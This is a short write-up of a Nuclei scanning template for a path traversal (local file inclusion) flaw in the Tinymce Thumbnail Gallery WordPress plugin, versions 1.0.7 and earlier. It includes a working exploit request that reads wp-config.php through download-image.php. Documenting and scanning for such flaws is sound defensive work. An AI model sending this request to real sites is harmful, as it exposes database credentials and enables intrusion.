# Nuclei Template: Tinymce Thumbnail Gallery <=1.0.7 - Local File Inclusion
**Template ID:** wp-tinymce-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`wp-tinymce-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Tinymce Thumbnail Gallery 1.0.7 and before are vulnerable to local file inclusion via download-image.php.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php
```

## References
- https://wpscan.com/vulnerability/4a49b023-c1c9-4cc4-a2fd-af5f911bb400
- http://wordpress.org/extend/plugins/tinymce-thumbnail-gallery/
